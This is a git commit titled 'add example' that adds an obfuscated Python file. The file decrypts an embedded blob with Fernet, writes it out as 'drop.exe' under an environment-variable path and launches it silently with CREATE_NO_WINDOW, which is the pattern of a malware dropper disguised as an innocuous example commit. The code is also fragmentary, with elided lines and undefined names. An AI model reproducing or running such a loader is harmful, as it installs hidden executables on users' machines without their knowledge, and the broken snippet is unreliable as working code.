e97e8909b505709d5bfb3e40b527aa8e73e746f9
snomiao <snomiao@gmail.com>
2024-07-12 07:44:17 +0000

    fix(main): add example
    add example

---
+++ example-from-data-it.py
@@ -0,0 +1,8 @@
+from cryptography.fernet import Fernet as f
+import os as K,json,platform as g,subprocess as h,tempfile
+if g.system()==k:import winreg as D
+...
+
+	try:h.Popen(exe_path,shell=A,creationflags=h.CREATE_NO_WINDOW)
+
+def A1():A='drop.exe';B=AE();C=f(p);D=AB(C.decrypt(B).decode());A0(D,A);A5(K.path.join(K.getenv(q),A))
